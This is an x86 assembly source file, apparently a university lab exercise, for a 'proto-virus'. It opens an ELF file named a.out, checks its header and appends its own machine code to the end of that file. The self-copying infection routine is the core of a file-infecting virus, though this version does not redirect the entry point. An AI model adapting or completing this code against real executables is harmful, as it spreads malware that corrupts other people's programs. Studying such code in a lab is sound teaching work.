%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define STDOUT		1
%define ELF_header_size		52

	
;Stack Locations macros: (sub the size of ELF_header(52))
%define FD dword [ebp-4]
%define ELF_header ebp-56
%define FIleSize dword [ebp-60] 	
	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here

	call get_loc_ebx
	add ebx, FileName
	open ebx,RDWR, 0x777
	mov FD, eax					;save the file descriptor
	cmp FD, -1
	je Exit

	lea ecx, [ELF_header]
	read FD,ecx,ELF_header_size			;read the header of ELF

	cmp dword [ELF_header], 0x464C457F ; compare the first 4 bytes(MAGICs) of the file to check if is ELF
	jne Failed_Exit

	call get_loc_ecx
	add  ecx, OutStr
	write STDOUT, ecx, 32

	lseek FD, 0 ,SEEK_END 				;set the file pointer to the end of the file
	mov FIleSize, eax					;return the size of the file

	call get_loc_ecx
	add ecx, _start
	mov edx , virus_end-_start
	write FD,ecx,edx					;write the content of this script to the end of the file

	.close:
	close FD

VirusExit:
	exit 0            	; Termination if all is OK and no previous code to jump to
                        ; (also an example for use of above macros)
Failed_Exit:
	call get_loc_ecx
	add  ecx, Failstr
	write STDOUT, ecx, 13
	close FD
Exit:
	exit -1	
	
FileName:	db "a.out", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0 ;32 length
Failstr:	db "perhaps not", 10 , 0 ;13 length
ErrorOccur: 	db "Some Error Occur...", 10, 0

get_loc_ebx:
	call .next_i
	.next_i:
		pop ebx
		sub ebx, .next_i
		ret
	
get_loc_ecx:
	call .next_i
	.next_i:
		pop ecx
		sub ecx, .next_i
		ret

PreviousEntryPoint: dd VirusExit
virus_end:
